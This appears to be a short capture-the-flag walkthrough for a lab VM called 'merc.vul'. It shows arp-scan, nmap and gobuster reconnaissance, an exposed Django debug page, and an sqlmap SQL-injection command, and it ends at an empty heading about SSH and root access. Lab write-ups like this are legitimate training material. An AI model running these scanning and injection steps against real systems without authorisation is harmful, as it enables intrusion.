# TITLE
'url'

## Discovery

### Tool used: arp-scan
<br>

```
arp-scan --interface=ens33 --localnet

Interface: ens33, type: EN10MB, MAC: 00:0c:29:01:a5:1c, IPv4: 172.16.250.97
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)

172.16.250.91	08:00:27:dc:40:fb	PCS Systemtechnik GmbH
```

## Port scan

### Tool used: nmap
<br>

```
nmap -T4 -sV -p22,8080 merc.vul

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 17:00 CDT
Nmap scan report for merc.vul (172.16.250.91)
Host is up (0.00055s latency).
```

## HTTP enumeration

### Tool used: gobuster
<br>

```
gobuster dir --url http://merc.vul:8080 --wordlist /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
```

Browsing the URL in the browser didn't reveal anything, until we added text to the end, such as a * or /admin. This revealed an error page indicating Django was installed and DEBUG mode was enabled.<br><br>

![browsing the url](./docs/files/file.png)

NOTES AND STEPS:<br><br>

## SQL injection
### You can either manually try strings, or use a tool like SQLMap
<br>

### Tool used: SQLMap
<br>

```
sqlmap -u http://merc.vul:8080/mercuryfacts/1 --answers="follow=Y" --batch

      ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
```

---

### Tool used: none / browser URL strings

## SSH and root access

### Tool used: msfconsole
<br>